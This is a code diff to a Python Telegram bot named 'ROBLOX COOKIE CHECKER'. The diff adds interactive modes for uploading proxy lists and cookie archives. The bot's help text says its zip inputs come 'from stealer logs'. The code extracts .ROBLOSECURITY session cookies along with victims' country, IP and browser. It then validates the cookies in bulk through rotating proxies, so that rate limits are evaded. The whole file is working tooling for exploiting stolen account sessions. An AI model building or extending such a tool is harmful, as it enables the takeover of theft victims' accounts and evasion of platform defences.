@@ -2,6 +2,7 @@ import asyncio
 import aiohttp
 import aiohttp_socks
 import telebot
+from telebot import types
 import time
 import threading
 import re
@@ -9,9 +10,118 @@ import os
 import zipfile
 import io
 import random
+import requests
 from config import BOT_TOKEN, OWNER_ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# ─── Proxy Input Session ────────────────────────────────────────────
+# Tracks per-user proxy input mode so users can paste, upload files,
+# or send URLs one-by-one and then press "Done" to load them all.
+
+class ProxyInputSession:
+    """Holds accumulated proxy lines while a user is in proxy-input mode."""
+
+    def __init__(self, chat_id, msg_id):
+        self.chat_id = chat_id
+        self.msg_id = msg_id          # the status message we keep editing
+        self.btn_msg_id = None        # the Done/Cancel button message (always latest)
+        self.lines: list = []         # accumulated raw proxy lines
+        self.sources: list = []       # description of each source
+        self.user_msgs: list = []     # message_ids from user (to delete on Done)
+        self.bot_replies: list = []   # message_ids from bot replies (to delete on Done)
+
+    def add_lines(self, raw_text: str, source_desc: str):
+        added = 0
+        for line in raw_text.splitlines():
+            line = line.strip()
+            if line and not line.startswith("#"):
+                self.lines.append(line)
+                added += 1
+        if added:
+            self.sources.append(f"{source_desc} ({added} lines)")
+        return added
+
+    @property
+    def total(self):
+        return len(self.lines)
+
+    def status_text(self):
+        src_list = "\n".join(f"  • {s}" for s in self.sources) if self.sources else "  None yet"
+        return (
+            f"🌐 *Proxy Input Mode*\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 Collected: *{self.total}* proxy lines\n"
+            f"📥 Sources:\n"
+            f"{src_list}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Send more proxies, files, or URLs."
+        )
+
+# chat_id -> ProxyInputSession
+proxy_sessions: dict[int, ProxyInputSession] = {}
+
+# ─── Check Input Session ─────────────────────────────────────────────
+# Tracks per-user check mode so they can just send /check then upload files
+
+class CheckInputSession:
+    """Holds cookie entries while a user is in check-input mode."""
+
+    def __init__(self, chat_id, msg_id):
+        self.chat_id = chat_id
+        self.msg_id = msg_id          # the status message we keep editing
+        self.btn_msg_id = None        # the Start/Cancel button message
+        self.cookie_entries: list = []  # accumulated cookie entries (with .ROBLOSECURITY)
+        self.no_cookie_count: int = 0   # files without .ROBLOSECURITY
+        self.filenames: list = []       # track which files were loaded
+        self.user_msgs: list = []       # user message ids (to delete on start)
+        self.bot_replies: list = []     # bot reply message ids (to delete on start)
+
+    def add_entries(self, entries, no_cookie, filename):
+        self.cookie_entries.extend(entries)
+        self.no_cookie_count += no_cookie
+        self.filenames.append(filename)
+
+    @property
+    def total(self):
+        return len(self.cookie_entries)
+
+    @property
+    def total_files(self):
+        return len(self.cookie_entries) + self.no_cookie_count
+
+    def status_text(self):
+        if not self.filenames:
+            return (
+                f"\U0001f50d *Check Mode*\n"
+                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
+                f"\U0001f4ca Total Files: *0*\n"
+                f"\U0001f511 Valid Cookies: *0*\n"
+                f"\U0001f6ab No Cookie: *0*\n"
+                f"\U0001f4e5 Files: None yet\n"
+                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
+                f"Send a .zip or .txt file with cookies."
+            )
+        file_list = "\n".join(f"  \u2022 `{f}`" for f in self.filenames)
+        no_cookie_info = f"\n\U0001f6ab No Cookie: *{self.no_cookie_count}*" if self.no_cookie_count else ""
+        proxy_info = ""
+        if proxy_rotator.enabled:
+            total_p, alive_p = proxy_rotator.count()
+            proxy_info = f"\n\U0001f310 Proxy: {alive_p}/{total_p}"
+        return (
+            f"\U0001f50d *Check Mode*\n"
+            f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
+            f"\U0001f4ca Total Files: *{self.total_files}*\n"
+            f"\U0001f511 Valid Cookies: *{self.total}*\n"
+            f"{no_cookie_info}{proxy_info}\n"
+            f"\U0001f4e5 Files:\n"
+            f"{file_list}\n"
+            f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
+            f"Send more files or press *Start \u2705* to begin checking."
+        )
+
+# chat_id -> CheckInputSession
+check_sessions: dict[int, CheckInputSession] = {}
 
 # ─── Proxy Rotator ────────────────────────────────────────────────────
 class ProxyRotator:
@@ -286,14 +396,19 @@ def fast_extract_roblosecurity(content):
     return extract_roblosecurity(content)
 
 def process_upload(file_content, filename):
-    """Process an uploaded file and return list of (roblosecurity, country, ip, browser, filename).
+    """Process an uploaded file and return (cookie_entries, no_cookie_count).
     
     Supports:
     - .zip containing cookie .txt files (fast parallel extraction)
     - .txt with one cookie per line (plain format)
     - .txt in Netscape cookie format
+    
+    Returns:
+    - cookie_entries: list of tuples (roblosecurity, country, ip, browser, filename)
+    - no_cookie_count: number of files that had no .ROBLOSECURITY cookie
     """
     cookie_entries = []
+    no_cookie_count = 0
     
     if filename.endswith('.zip'):
         try:
@@ -305,32 +420,38 @@ def process_upload(file_content, filename):
                 # Read all files at once for speed
                 for name in txt_files:
                     try:
-                        content = zf.read(name).decode('utf-8', errors='ignore')
+                        file_content_text = zf.read(name).decode('utf-8', errors='ignore')
                         basename = os.path.basename(name)
                         country, ip, browser = parse_filename(basename)
-                        roblosecurity = fast_extract_roblosecurity(content)
+                        roblosecurity = fast_extract_roblosecurity(file_content_text)
                         if roblosecurity:
                             cookie_entries.append((roblosecurity, country, ip, browser, basename))
                         else:
-                            # Track no-cookie files in stats later
-                            pass
+                            no_cookie_count += 1
                     except Exception:
-                        continue
+                        no_cookie_count += 1
         except zipfile.BadZipFile:
             pass
     else:
-        content = file_content.decode('utf-8', errors='ignore')
-        roblosecurity = fast_extract_roblosecurity(content)
+        file_text = file_content.decode('utf-8', errors='ignore')
+        roblosecurity = fast_extract_roblosecurity(file_text)
         if roblosecurity:
             country, ip, browser = parse_filename(filename)
             cookie_entries.append((roblosecurity, country, ip, browser, filename))
         else:
-            for line in content.splitlines():
+            plain_lines = []
+            for line in file_text.splitlines():
                 line = line.strip()
                 if line and not line.startswith("#"):
+                    plain_lines.append(line)
+            if plain_lines:
+                for line in plain_lines:
                     cookie_entries.append((line, "??", "?.?.?.?", "Direct", "manual"))
+            else:
+                no_cookie_count += 1
     
-    return cookie_entries
+    return cookie_entries, no_cookie_count
+
 
 # ─── Progress message builder ─────────────────────────────────────────
 def build_progress_text():
@@ -440,9 +561,6 @@ async def validate_cookie(session, roblosecurity, use_proxy=True):
 
 async def run_checker(chat_id, progress_msg, cookie_entries):
     """Run the checker with concurrency, proxy rotation, and live progress updates."""
-    stats.reset()
-    stats.total = len(cookie_entries)
-    stats.start_time = time.time()
 
     # Create connector based on proxy type
     connector_kwargs = {"limit": CONCURRENCY, "limit_per_host": 0}  # no per-host limit with proxies
@@ -608,8 +726,8 @@ def handle_menu(message):
         message,
         f"⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
         f"━━━━━━━━━━━━━━━━━\n\n"
-        f"🔥 /check - Check cookies from .zip or .txt\n"
-        f"🌐 /proxy - Load proxy list (file or GitHub URL)\n"
+        f"🔥 /check - Check cookies (interactive: send files then start)\n"
+        f"🌐 /proxy - Load proxies (interactive: paste, file, or URL)\n"
         f"📊 /stats - View current checker stats\n"
         f"🗑️ /proxyclear - Clear all proxies\n"
         f"❓ /help - How to use the bot\n"
@@ -627,92 +745,334 @@ def handle_help(message):
     bot.reply_to(
         message,
         "⚡️ *Cookie Checker Help* ⚡️\n\n"
-        "🔥 *Checking Cookies:*\n"
-        "1️⃣ Send /check with a .zip or .txt file\n"
-        "2️⃣ .zip = cookie files from stealer logs\n"
-        "3️⃣ .txt = plain cookies (one per line) or Netscape format\n"
-        "4️⃣ Live progress shown during checking\n\n"
-        "🌐 *Proxy Setup:*\n"
-        "1️⃣ /proxy with a .txt file attached (one proxy per line)\n"
-        "2️⃣ /proxy with a GitHub raw URL as caption\n"
-        "3️⃣ Supports: ip:port, ip:port:user:pass, user:pass@ip:port\n"
-        "4️⃣ Supports: http://, https://, socks4://, socks5://\n"
-        "5️⃣ Auto-rotates proxies and removes dead ones\n\n"
-        "💡 Tip: Use proxies to avoid rate limits!",
+        "🔥 *Checking Cookies (Interactive):*\n"
+        "1️⃣ /check → enters check mode\n"
+        "2️⃣ Send .zip or .txt files with cookies\n"
+        "3️⃣ Upload multiple files if needed\n"
+        "4️⃣ Press 🚀 Start Check to begin\n"
+        "5️⃣ .zip = cookie files from stealer logs\n"
+        "6️⃣ .txt = plain cookies (one per line) or Netscape format\n"
+        "7️⃣ Live progress shown during checking\n\n"
+        "🌐 *Proxy Setup (Interactive):*\n"
+        "1️⃣ /proxy → enters proxy input mode\n"
+        "2️⃣ Paste proxy lines directly in chat\n"
+        "3️⃣ Upload .txt files with proxies\n"
+        "4️⃣ Send GitHub raw / pastebin URLs\n"
+        "5️⃣ Mix all methods, send multiple times\n"
+        "6️⃣ Press Done ✅ to load, Cancel ❌ to abort\n\n"
+        "📋 *Supported proxy formats:*\n"
+        "• ip:port\n"
+        "• ip:port:user:pass\n"
+        "• user:pass@ip:port\n"
+        "• http://, https://, socks4://, socks5://\n\n"
+        "💡 Auto-rotates proxies and removes dead ones!",
         parse_mode="Markdown"
     )
 
 @bot.message_handler(commands=["proxy"])
 @owner_only
 def handle_proxy(message):
-    args = message.text.split(maxsplit=1)
+    """Enter interactive proxy-input mode.
 
-    # Option 1: GitHub raw URL in command
-    if len(args) >= 2 and ("github" in args[1].lower() or "raw.githubusercontent" in args[1].lower()):
-        url = args[1].strip()
-        bot.reply_to(message, f"📥 Downloading proxy list from URL...")
+    The user can then:
+    • Paste proxy lines directly as text messages
+    • Upload .txt files containing proxies
+    • Send GitHub / raw.githubusercontent.com URLs
+    • Mix any of the above, multiple times
+
+    When finished, press the Done ✅ button to load everything.
+    Press Cancel ❌ to abort without loading.
+    """
+    chat_id = message.chat.id
+
+    # If already in a proxy session, just update the status
+    if chat_id in proxy_sessions:
+        sess = proxy_sessions[chat_id]
         try:
-            import requests
-            resp = requests.get(url, timeout=15)
-            if resp.status_code == 200:
-                proxy_rotator.load_from_text(resp.text)
-                total_p, alive_p = proxy_rotator.count()
-                bot.reply_to(
-                    message,
-                    f"✅ *Proxies Loaded from URL!*\n"
-                    f"━━━━━━━━━━━━━━━━━\n"
-                    f"📝 Total: {total_p}\n"
-                    f"✅ Valid: {alive_p}\n"
-                    f"🌐 Proxy rotation enabled!",
-                    parse_mode="Markdown"
-                )
-            else:
-                bot.reply_to(message, f"❌ Failed to download: HTTP {resp.status_code}")
-        except Exception as e:
-            bot.reply_to(message, f"❌ Error downloading: {e}")
+            bot.edit_message_text(
+                sess.status_text(),
+                chat_id,
+                sess.msg_id,
+                parse_mode="Markdown",
+                reply_markup=_proxy_mode_keyboard()
+            )
+        except Exception:
+            pass
+        bot.reply_to(message, "⚠️ You're already in proxy input mode. Keep sending proxies or press Done ✅.")
         return
 
-    # Option 2: File attached
-    if not message.document:
-        bot.reply_to(
-            message,
-            "❌ Please attach a .txt file with proxies OR provide a GitHub raw URL.\n\n"
-            "Usage:\n"
-            "• `/proxy` with .txt file attached\n"
-            "• `/proxy https://raw.githubusercontent.com/.../proxies.txt`\n\n"
-            "Supported formats:\n"
-            "• `ip:port`\n"
-            "• `ip:port:user:pass`\n"
-            "• `user:pass@ip:port`\n"
-            "• `http://ip:port`\n"
-            "• `http://user:pass@ip:port`\n"
-            "• `https://ip:port`\n"
-            "• `socks4://ip:port`\n"
-            "• `socks5://user:pass@ip:port`",
+    # Create a new session — status message first (no buttons)
+    status_msg = bot.reply_to(
+        message,
+        "🌐 *Proxy Input Mode*\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📊 Collected: *0* proxy lines\n"
+        "📥 Sources:\n"
+        "  None yet\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send proxies by:\n"
+        "• Pasting proxy lines directly\n"
+        "• Uploading a .txt file\n"
+        "• Sending a GitHub raw URL",
+        parse_mode="Markdown"
+    )
+
+    # Send Done/Cancel buttons as a separate message (always at bottom)
+    btn_msg = bot.send_message(
+        chat_id,
+        "👇 Click when finished:",
+        reply_markup=_proxy_mode_keyboard()
+    )
+
+    sess = ProxyInputSession(chat_id, status_msg.message_id)
+    sess.btn_msg_id = btn_msg.message_id
+    proxy_sessions[chat_id] = sess
+
+
+def _proxy_mode_keyboard():
+    """Inline keyboard for proxy input mode."""
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("✅ Done", callback_data="proxy_done"),
+        types.InlineKeyboardButton("❌ Cancel", callback_data="proxy_cancel"),
+    )
+    return markup
+
+
+def _update_session_status(sess):
+    """Edit the status message and repost the Done/Cancel buttons at the bottom."""
+    # Edit the status message (no inline keyboard on this one)
+    try:
+        bot.edit_message_text(
+            sess.status_text(),
+            sess.chat_id,
+            sess.msg_id,
             parse_mode="Markdown"
         )
+    except Exception:
+        pass
+
+    # Delete old button message if it exists
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(sess.chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+
+    # Send a fresh button message so it's always at the bottom of the chat
+    try:
+        btn_msg = bot.send_message(
+            sess.chat_id,
+            "👇 Click when finished:",
+            reply_markup=_proxy_mode_keyboard()
+        )
+        sess.btn_msg_id = btn_msg.message_id
+    except Exception:
+        pass
+
+
+def _is_github_raw_url(text):
+    """Check if text looks like a GitHub raw / paste URL."""
+    lower = text.lower().strip()
+    return any(domain in lower for domain in [
+        "github.com", "raw.githubusercontent.com", "pastebin.com",
+        "paste.ee", "rentry.co", "hastebin.com"
+    ])
+
+
+def _fetch_url_text(url):
+    """Download text content from a URL. Returns None on failure."""
+    try:
+        resp = requests.get(url, timeout=15)
+        if resp.status_code == 200:
+            return resp.text
+    except Exception:
+        pass
+    return None
+
+
+def _process_proxy_input(message):
+    """Handle a regular text / document message while in proxy-input mode."""
+    chat_id = message.chat.id
+    if chat_id not in proxy_sessions:
+        return False  # not in proxy mode
+
+    sess = proxy_sessions[chat_id]
+
+    # Track the user's original message for cleanup
+    sess.user_msgs.append(message.message_id)
+
+    # ── 1) Document (.txt file) attached ────────────────────────────
+    if message.document:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        file_content = downloaded.decode("utf-8", errors="ignore")
+        fname = message.document.file_name or "file.txt"
+        added = sess.add_lines(file_content, f"📄 {fname}")
+        if added:
+            r = bot.reply_to(message, f"✅ Added *{added}* proxies from `{fname}`", parse_mode="Markdown")
+            sess.bot_replies.append(r.message_id)
+        else:
+            r = bot.reply_to(message, "⚠️ No valid proxy lines found in that file.")
+            sess.bot_replies.append(r.message_id)
+        _update_session_status(sess)
+        return True
+
+    # ── 2) Text message ─────────────────────────────────────────────
+    text = message.text
+    if not text:
+        return True
+
+    text = text.strip()
+
+    # Check if it's a URL (GitHub raw, pastebin, etc.)
+    if _is_github_raw_url(text):
+        # Extract URL — might be the whole message or embedded
+        url_match = re.search(r'(https?://[^\s]+)', text)
+        if url_match:
+            url = url_match.group(1)
+            r = bot.reply_to(message, "📥 Downloading proxy list...")
+            sess.bot_replies.append(r.message_id)
+            url_content = _fetch_url_text(url)
+            if url_content:
+                added = sess.add_lines(url_content, "🔗 URL")
+                if added:
+                    r2 = bot.reply_to(message, f"✅ Added *{added}* proxies from URL", parse_mode="Markdown")
+                    sess.bot_replies.append(r2.message_id)
+                else:
+                    r2 = bot.reply_to(message, "⚠️ Downloaded but no valid proxy lines found.")
+                    sess.bot_replies.append(r2.message_id)
+            else:
+                r2 = bot.reply_to(message, "❌ Failed to download from that URL.")
+                sess.bot_replies.append(r2.message_id)
+            _update_session_status(sess)
+            return True
+
+    # Plain pasted proxy lines
+    added = sess.add_lines(text, "✏️ Pasted")
+    if added:
+        r = bot.reply_to(message, f"✅ Added *{added}* proxy lines", parse_mode="Markdown")
+        sess.bot_replies.append(r.message_id)
+    else:
+        r = bot.reply_to(message, "⚠️ No valid proxy lines detected in that message.")
+        sess.bot_replies.append(r.message_id)
+    _update_session_status(sess)
+    return True
+
+
+# ── Catch-all handler for messages while in proxy mode ───────────────
+# We register this with higher priority so it fires BEFORE other message
+# handlers when the user is in proxy-input mode.
+
+@bot.message_handler(func=lambda m: m.chat.id in proxy_sessions, content_types=["text", "document"])
+def proxy_mode_catchall(message):
+    """Intercept text/document messages while the user is in proxy-input mode."""
+    _process_proxy_input(message)
+
+
+# ── Callback handlers for Done / Cancel buttons ─────────────────────
+
+@bot.callback_query_handler(func=lambda call: call.data == "proxy_done")
+def callback_proxy_done(call):
+    chat_id = call.message.chat.id
+    if chat_id not in proxy_sessions:
+        bot.answer_callback_query(call.id, "⚠️ No active proxy session.", show_alert=True)
         return
 
-    file_info = bot.get_file(message.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
-    content = downloaded.decode('utf-8', errors='ignore')
+    sess = proxy_sessions.pop(chat_id)
+    all_text = "\n".join(sess.lines)
 
-    proxy_rotator.load_from_text(content)
+    # ── Cleanup: delete all user proxy messages and bot replies ──────
+    for mid in sess.user_msgs:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    for mid in sess.bot_replies:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+
+    # Delete the button message and status message
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+
+    if not all_text.strip():
+        try:
+            bot.delete_message(chat_id, sess.msg_id)
+        except Exception:
+            pass
+        bot.answer_callback_query(call.id, "No proxies collected.")
+        return
+
+    # Load everything into the proxy rotator
+    proxy_rotator.load_from_text(all_text)
     total_p, alive_p = proxy_rotator.count()
 
     if total_p == 0:
-        bot.reply_to(message, "❌ No valid proxies found in the file.")
+        bot.edit_message_text(
+            "❌ No valid proxies found in the collected data.",
+            chat_id,
+            sess.msg_id
+        )
+        bot.answer_callback_query(call.id, "No valid proxies.")
         return
 
-    bot.reply_to(
-        message,
+    src_list = "\n".join(f"  • {s}" for s in sess.sources)
+    bot.edit_message_text(
         f"✅ *Proxies Loaded!*\n"
-        f"━━━━━━━━━━━━━━━━━\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
         f"📝 Total: {total_p}\n"
         f"✅ Valid: {alive_p}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📥 Sources:\n"
+        f"{src_list}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
         f"🌐 Proxy rotation enabled!",
+        chat_id,
+        sess.msg_id,
         parse_mode="Markdown"
     )
+    bot.answer_callback_query(call.id, f"✅ {alive_p}/{total_p} proxies loaded!")
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "proxy_cancel")
+def callback_proxy_cancel(call):
+    chat_id = call.message.chat.id
+    if chat_id not in proxy_sessions:
+        bot.answer_callback_query(call.id, "⚠️ No active proxy session.", show_alert=True)
+        return
+
+    sess = proxy_sessions.pop(chat_id)
+
+    # Cleanup: delete all user proxy messages and bot replies
+    for mid in sess.user_msgs:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    for mid in sess.bot_replies:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+
+    # Delete status message and button message too
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+    try:
+        bot.delete_message(chat_id, sess.msg_id)
+    except Exception:
+        pass
+
+    bot.answer_callback_query(call.id, "Cancelled.")
 
 @bot.message_handler(commands=["proxyclear"])
 @owner_only
@@ -727,48 +1087,308 @@ def handle_proxy_clear(message):
 @bot.message_handler(commands=["check"])
 @owner_only
 def handle_check(message):
-    if not message.document:
-        bot.reply_to(message, "❌ Please attach a .zip or .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
+    """Enter interactive check-input mode.
+
+    The user sends /check, then uploads .zip or .txt files.
+    They can upload multiple files, then press Start ✅ to begin checking.
+    """
+    chat_id = message.chat.id
+
+    # If already in a check session, just update the status
+    if chat_id in check_sessions:
+        sess = check_sessions[chat_id]
+        _update_check_session_status(sess)
+        bot.reply_to(message, "⚠️ You're already in check mode. Send a file or press Start ✅.")
         return
+
+    # Create a new session
+    status_msg = bot.reply_to(
+        message,
+        "🔍 *Check Mode*\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📊 Cookies: *0*\n"
+        "📥 Files: None yet\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "Send a .zip or .txt file with cookies.",
+        parse_mode="Markdown"
+    )
+
+    sess = CheckInputSession(chat_id, status_msg.message_id)
+    check_sessions[chat_id] = sess
+
+
+def _check_mode_keyboard():
+    """Inline keyboard for check input mode."""
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🚀 Start Check", callback_data="check_start"),
+        types.InlineKeyboardButton("❌ Cancel", callback_data="check_cancel"),
+    )
+    return markup
+
+
+def _update_check_session_status(sess):
+    """Edit the status message and repost the Start/Cancel buttons at the bottom."""
+    try:
+        bot.edit_message_text(
+            sess.status_text(),
+            sess.chat_id,
+            sess.msg_id,
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
+    # Delete old button message if it exists
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(sess.chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+
+    # Send a fresh button message so it's always at the bottom
+    try:
+        btn_msg = bot.send_message(
+            sess.chat_id,
+            "👇 Ready to check?",
+            reply_markup=_check_mode_keyboard()
+        )
+        sess.btn_msg_id = btn_msg.message_id
+    except Exception:
+        pass
+
+
+def _process_check_input(message):
+    """Handle a document message while in check-input mode."""
+    chat_id = message.chat.id
+    if chat_id not in check_sessions:
+        return False
+
+    sess = check_sessions[chat_id]
+
+    # Track the user's message for cleanup
+    sess.user_msgs.append(message.message_id)
+
+    # Only accept documents
+    if not message.document:
+        r = bot.reply_to(message, "⚠️ Please send a .zip or .txt file with cookies.")
+        sess.bot_replies.append(r.message_id)
+        return True
 
     file_info = bot.get_file(message.document.file_id)
     downloaded = bot.download_file(file_info.file_path)
     filename = message.document.file_name or "unknown.txt"
 
-    cookie_entries = process_upload(downloaded, filename)
+    cookie_entries, no_cookie_count = process_upload(downloaded, filename)
 
-    if not cookie_entries:
-        bot.reply_to(message, "❌ No .ROBLOSECURITY cookies found in the file.")
+    total_files = len(cookie_entries) + no_cookie_count
+
+    if total_files == 0:
+        r = bot.reply_to(message, f"\u274c No cookie files found in `{filename}`.")
+        sess.bot_replies.append(r.message_id)
+        _update_check_session_status(sess)
+        return True
+
+    sess.add_entries(cookie_entries, no_cookie_count, filename)
+    
+    status_parts = []
+    if cookie_entries:
+        status_parts.append(f"\u2705 *{len(cookie_entries)}* valid cookies")
+    if no_cookie_count:
+        status_parts.append(f"\U0001f6ab *{no_cookie_count}* no cookie")
+    status_msg = " | ".join(status_parts)
+    r = bot.reply_to(message, f"{status_msg} from `{filename}`", parse_mode="Markdown")
+    sess.bot_replies.append(r.message_id)
+    _update_check_session_status(sess)
+    return True
+
+    sess.add_entries(cookie_entries, filename)
+    r = bot.reply_to(message, f"✅ Added *{len(cookie_entries)}* cookies from `{filename}`", parse_mode="Markdown")
+    sess.bot_replies.append(r.message_id)
+    _update_check_session_status(sess)
+    return True
+
+
+# ── Catch-all handler for documents while in check mode ──────────────
+
+@bot.message_handler(func=lambda m: m.chat.id in check_sessions, content_types=["text", "document"])
+def check_mode_catchall(message):
+    """Intercept text/document messages while the user is in check-input mode."""
+    _process_check_input(message)
+
+
+# ── Callback handlers for Start / Cancel buttons ────────────────────
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_start")
+def callback_check_start(call):
+    chat_id = call.message.chat.id
+    if chat_id not in check_sessions:
+        bot.answer_callback_query(call.id, "⚠️ No active check session.", show_alert=True)
         return
 
+    sess = check_sessions.pop(chat_id)
+
+    if not sess.cookie_entries:
+        # No cookies loaded — cleanup and inform
+        for mid in sess.user_msgs:
+            try:
+                bot.delete_message(chat_id, mid)
+            except Exception:
+                pass
+        for mid in sess.bot_replies:
+            try:
+                bot.delete_message(chat_id, mid)
+            except Exception:
+                pass
+        if sess.btn_msg_id:
+            try:
+                bot.delete_message(chat_id, sess.btn_msg_id)
+            except Exception:
+                pass
+        try:
+            bot.delete_message(chat_id, sess.msg_id)
+        except Exception:
+            pass
+        bot.answer_callback_query(call.id, "No cookies loaded.")
+        return
+
+    # ── Cleanup: delete all user messages and bot replies ────────────
+    for mid in sess.user_msgs:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    for mid in sess.bot_replies:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+
+    # ── Start the checker ────────────────────────────────────────────
+    cookie_entries = sess.cookie_entries
+    no_cookie_count = sess.no_cookie_count
+    total_files = len(cookie_entries) + no_cookie_count
+
+    # If no valid cookies AND no files at all, cleanup and inform
+    if total_files == 0:
+        # No cookies loaded - cleanup and inform
+        for mid in sess.user_msgs:
+            try:
+                bot.delete_message(chat_id, mid)
+            except Exception:
+                pass
+        for mid in sess.bot_replies:
+            try:
+                bot.delete_message(chat_id, mid)
+            except Exception:
+                pass
+        if sess.btn_msg_id:
+            try:
+                bot.delete_message(chat_id, sess.btn_msg_id)
+            except Exception:
+                pass
+        try:
+            bot.delete_message(chat_id, sess.msg_id)
+        except Exception:
+            pass
+        bot.answer_callback_query(call.id, "No cookies loaded.")
+        return
+
+    # Cleanup: delete all user messages and bot replies
+    for mid in sess.user_msgs:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    for mid in sess.bot_replies:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+
+    # Start the checker
     stats.reset()
-    stats.total = len(cookie_entries)
     stats.start_time = time.time()
+    stats.total = total_files
+    stats.no_cookie = no_cookie_count
+    stats.checked = no_cookie_count  # no-cookie files are already "checked"
 
     proxy_info = ""
     if proxy_rotator.enabled:
         total_p, alive_p = proxy_rotator.count()
-        proxy_info = f"\n🌐 Proxy: {alive_p}/{total_p}"
+        proxy_info = f"\n\U0001f310 Proxy: {alive_p}/{total_p}"
 
-    bot.send_message(
-        message.chat.id,
-        f"📂 *File:* `{filename}`\n"
-        f"🔑 *Cookies found:* {len(cookie_entries)}{proxy_info}\n"
-        f"🚀 Starting check...",
+    file_list = ", ".join(f"`{f}`" for f in sess.filenames)
+    
+    cookie_info = f"\U0001f511 Valid Cookies: {len(cookie_entries)}"
+    if no_cookie_count:
+        cookie_info += f" | \U0001f6ab No Cookie: {no_cookie_count}"
+    
+    bot.edit_message_text(
+        f"\U0001f4c2 *Files:* {file_list}\n"
+        f"{cookie_info}{proxy_info}\n"
+        f"\U0001f680 Starting check...",
+        chat_id,
+        sess.msg_id,
         parse_mode="Markdown"
     )
-    progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")
+    progress_msg = bot.send_message(chat_id, build_progress_text(), parse_mode="Markdown")
 
     def run_in_thread():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         try:
-            loop.run_until_complete(run_checker(message.chat.id, progress_msg, cookie_entries))
+            loop.run_until_complete(run_checker(chat_id, progress_msg, cookie_entries))
         finally:
             loop.close()
 
     thread = threading.Thread(target=run_in_thread, daemon=True)
     thread.start()
+
+    bot.answer_callback_query(call.id, f"\U0001f680 Checking {len(cookie_entries)} cookies ({total_files} total files)!")
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_cancel")
+def callback_check_cancel(call):
+    chat_id = call.message.chat.id
+    if chat_id not in check_sessions:
+        bot.answer_callback_query(call.id, "⚠️ No active check session.", show_alert=True)
+        return
+
+    sess = check_sessions.pop(chat_id)
+
+    # Cleanup: delete all messages
+    for mid in sess.user_msgs:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    for mid in sess.bot_replies:
+        try:
+            bot.delete_message(chat_id, mid)
+        except Exception:
+            pass
+    if sess.btn_msg_id:
+        try:
+            bot.delete_message(chat_id, sess.btn_msg_id)
+        except Exception:
+            pass
+    try:
+        bot.delete_message(chat_id, sess.msg_id)
+    except Exception:
+        pass
+
+    bot.answer_callback_query(call.id, "Cancelled.")
 
 @bot.message_handler(commands=["stats"])
 @owner_only
